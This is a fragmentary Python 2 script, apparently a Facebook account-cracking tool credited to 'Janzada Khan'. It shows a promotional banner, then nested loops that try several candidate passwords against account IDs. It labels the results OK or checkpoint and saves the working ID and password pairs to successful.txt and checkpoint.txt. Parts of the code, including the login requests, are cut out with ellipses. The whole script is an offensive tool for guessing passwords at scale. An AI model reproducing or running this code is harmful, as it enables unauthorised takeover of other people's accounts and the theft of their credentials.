...
#!/usr/bin/python2
#coding=utf-8
#originally written by janzada khan
...
\033[1;37m \033[0;97m
 ...
 __|  |  _  |   | |__   |  _  |    \|  _  |
|  |  |     | | | |   __|     |  |  |     |
|_____|__|__|_|___|_____|__|__|____/|__|__|
                                           
 ------------------------------------------

   Author   : Janzada Khan
   Github   : https://github.com/***
   Youtube  : JanzadakhanOfiicial
   Telegram : Janzada Khan
   This tool is Free But Uploading 
...
def crack_select():
	...
	print(47*"-")
	print("")
	print("\t\033[1;32mCreated by: JAN (JAN) Group\033[0;97m")
	print(47*"-")
	print("")
	def main(arg):
		user=arg
		...
		try:
			...
			q = json.loads(data)
			if "loc" in q:
				print(" \033[1;35m[JAN-OK] \033[1;32m"+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error"]:
					print(" \033[1;33m[JAN-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					q = json.loads(data)
					if "loc" in q:
						print(" \033[1;35m[JAN-OK] \033[1;32m"+uid+" | "+pass2+"\033[0;97m")
						ok = open("successful.txt", "a")
						ok.write(uid+" | "+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error"]:
							print(" \033[1;33m[JAN-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("checkpoint.txt","a")
							cp.write(uid+" | "+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "loc" in q:
								print(" \033[1;35m[JAN-OK] \033[1;32m"+uid+" | "+pass3+"\033[0;97m")
								ok = open("successful.txt", "a")
								ok.write(uid+" | "+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error"]:
									print(" \033[1;33m[JAN-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("checkpoint.txt","a")
									cp.write(uid+" | "+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "loc" in q:
										print(" \033[1;35m[JAN-OK] \033[1;32m"+uid+" | "+pass4+"\033[0;97m")
										ok = open("successful.txt", "a")
										ok.write(uid+" | "+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error"]:
											print(" \033[1;33m[JAN-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("checkpoint.txt","a")
											cp.write(uid+" | "+pass4+"\n")
											cp.close()
